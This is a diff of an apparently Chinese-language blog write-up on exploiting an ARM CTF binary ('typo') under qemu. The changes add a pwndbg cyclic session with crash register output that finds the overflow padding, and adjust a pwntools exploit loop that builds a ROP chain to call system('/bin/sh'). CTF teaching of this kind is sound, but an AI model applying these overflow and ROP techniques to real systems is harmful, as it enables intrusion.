@@ -81,7 +81,7 @@
 
         
 
-        <li>Reading time 5 min</li>
+        <li>Reading time 6 min</li>
     </ul>
 </aside>
 
@@ -124,10 +124,6 @@ $ sudo apt-get install <span style="color:#e6db74">&#34;binfmt*&#34;</span></cod
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git clone https://github.com/pwndbg/pwndbg
 $ cd pwndbg
 $ ./setup.sh</code></pre></div>
-<blockquote>
-<p>打个小广告, 我对 pwndbg 做了一个 fork, 添加了一些功能, <a href="https://github.com/0x01f/Pwngdb">项目地址</a>, 在一些题目的调试上可能会更方便</p>
-</blockquote>
-
 <p>装好之后如图：</p>
 
 <p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5c1vzla8j30nb04t75m.jpg" alt="" /></p>
@@ -324,7 +320,58 @@ Strings information
 
 <p>这样在程序返回时, 经过 rop 就会实现 r0 -&gt; &ldquo;/bin/sh&rdquo;, r4 -&gt; junk_data, pc = system_addr 的效果, 进而执行 system(&ldquo;/bin/sh&rdquo;) 来 get shell</p>
 
-<p>此时还有一个问题, 不知道 padding 的长度, 本来是想通过 pwntools 的 cyclic/cyclic -l 来找长度, 但程序 crash 后qemu 直接退出, 而 IDA 查看 strip 的文件又看得我很头大, 于是想了一个笨方法, 爆破 padding 长度, 最终的 exp 如下:</p>
+<p>此时还有一个问题, 不知道 padding 的长度, 可以通过 pwntools 的 cyclic/cyclic -l 来找长度</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; cyclic <span style="color:#ae81ff">200</span>
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+pwndbg&gt; c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x62616164 in ?? <span style="color:#f92672">()</span>
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────────<span style="color:#f92672">[</span> REGISTERS <span style="color:#f92672">]</span>──────────────────────────────────────────────────
+ R0   0x0
+ R1   0xfffef024 ◂— 0x61616161 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;aaaa&#39;</span><span style="color:#f92672">)</span>
+ R2   0x7e
+ R3   0x0
+ R4   0x62616162 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;baab&#39;</span><span style="color:#f92672">)</span>
+ R5   0x0
+ R6   0x0
+ R7   0x0
+ R8   0x0
+ R9   0xa5ec ◂— push   <span style="color:#f92672">{</span>r3, r4, r5, r6, r7, r8, sb, lr<span style="color:#f92672">}</span>
+ R10  0xa68c ◂— push   <span style="color:#f92672">{</span>r3, r4, r5, lr<span style="color:#f92672">}</span>
+ R11  0x62616163 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;caab&#39;</span><span style="color:#f92672">)</span>
+ R12  0x0
+ SP   0xfffef098 ◂— 0x62616165 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;eaab&#39;</span><span style="color:#f92672">)</span>
+ PC   0x62616164 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;daab&#39;</span><span style="color:#f92672">)</span>
+───────────────────────────────────────────────────<span style="color:#f92672">[</span> DISASM <span style="color:#f92672">]</span>────────────────────────────────────────────────────
+Invalid address 0x62616164
+
+
+
+
+
+
+
+
+
+
+────────────────────────────────────────────────────<span style="color:#f92672">[</span> STACK <span style="color:#f92672">]</span>────────────────────────────────────────────────────
+<span style="color:#ae81ff">00</span>:0000│ sp  0xfffef098 ◂— 0x62616165 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;eaab&#39;</span><span style="color:#f92672">)</span>
+<span style="color:#ae81ff">01</span>:0004│     0xfffef09c ◂— 0x62616166 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;faab&#39;</span><span style="color:#f92672">)</span>
+<span style="color:#ae81ff">02</span>:0008│     0xfffef0a0 ◂— 0x62616167 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;gaab&#39;</span><span style="color:#f92672">)</span>
+<span style="color:#ae81ff">03</span>:000c│     0xfffef0a4 ◂— 0x62616168 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;haab&#39;</span><span style="color:#f92672">)</span>
+<span style="color:#ae81ff">04</span>:0010│     0xfffef0a8 ◂— 0x62616169 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;iaab&#39;</span><span style="color:#f92672">)</span>
+<span style="color:#ae81ff">05</span>:0014│     0xfffef0ac ◂— 0x6261616a <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;jaab&#39;</span><span style="color:#f92672">)</span>
+<span style="color:#ae81ff">06</span>:0018│     0xfffef0b0 ◂— 0x6261616b <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;kaab&#39;</span><span style="color:#f92672">)</span>
+<span style="color:#ae81ff">07</span>:001c│     0xfffef0b4 ◂— 0x6261616c <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;laab&#39;</span><span style="color:#f92672">)</span>
+Program received signal SIGSEGV
+pwndbg&gt; cyclic -l 0x62616164
+<span style="color:#ae81ff">112</span></code></pre></div>
+<hr />
+
+<p>或者可以直接爆破 padding 长度</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
 <span style="color:#75715e"># -*- coding: utf-8 -*-</span>
 __Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
@@ -334,7 +381,8 @@ __Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39
 <span style="color:#f92672">import</span> pdb
 <span style="color:#75715e">#  context.log_level = &#34;debug&#34;</span>
 
-<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">150</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
+<span style="color:#75715e">#  for i in range(100, 150)[::-1]:</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">113</span>):
     <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;l&#34;</span>:
         io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./typo&#34;</span>, timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>)
     <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;d&#34;</span>:
@@ -459,7 +507,8 @@ context<span style="color:#f92672">.</span>log_level <span style="color:#f92672"
 <p><a href="https://elixir.bootlin.com/linux/v2.6.32.51/source/arch/arm/include/asm/unistd.h">https://elixir.bootlin.com/linux/v2.6.32.51/source/arch/arm/include/asm/unistd.h</a>
 <a href="https://bbs.pediy.com/thread-224583.htm">https://bbs.pediy.com/thread-224583.htm</a>
 <a href="https://courses.washington.edu/cp105/02_Exceptions/Calling%20Standard.html">https://courses.washington.edu/cp105/02_Exceptions/Calling%20Standard.html</a>
-<a href="http://hideroot.tistory.com/46">http://hideroot.tistory.com/46</a></p>
+<a href="http://hideroot.tistory.com/46">http://hideroot.tistory.com/46</a>
+<a href="http://www.freebuf.com/articles/terminal/134980.html">http://www.freebuf.com/articles/terminal/134980.html</a></p>
 
 
 </article>
